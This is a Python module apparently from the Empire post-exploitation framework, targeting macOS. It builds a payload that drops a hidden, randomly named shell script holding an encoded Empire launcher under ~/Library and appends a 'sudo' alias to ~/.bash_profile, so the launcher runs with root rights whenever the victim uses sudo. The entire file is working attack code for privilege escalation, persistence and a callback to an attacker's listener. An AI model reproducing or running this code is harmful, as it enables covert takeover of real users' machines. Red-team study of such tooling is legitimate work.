from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # extract all of our options
        listenerName = params["Listener"]
        userAgent = params["UserAgent"]
        safeChecks = params["SafeChecks"]
        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(
            listenerName,
            language="python",
            encode=True,
            userAgent=userAgent,
            safeChecks=safeChecks,
        )
        launcher = launcher.replace('"', '\\"')
        return f"""
import os
from random import choice
from string import ascii_uppercase
home =  os.getenv("HOME")
randomStr = ''.join(choice(ascii_uppercase) for i in range(12))
bashlocation = home + "/Library/." + randomStr + ".sh"
with open(home + "/.bash_profile", "a") as profile:
    profile.write("alias sudo='sudo sh -c '\\\\''" + bashlocation + " & exec \\"$@\\"'\\\\'' sh'")
launcher = "{launcher}"
stager = "#!/bin/bash\\n"
stager += launcher
with open(bashlocation, 'w') as f:
    f.write(stager)
    f.close()
os.chmod(bashlocation, 0755)
"""
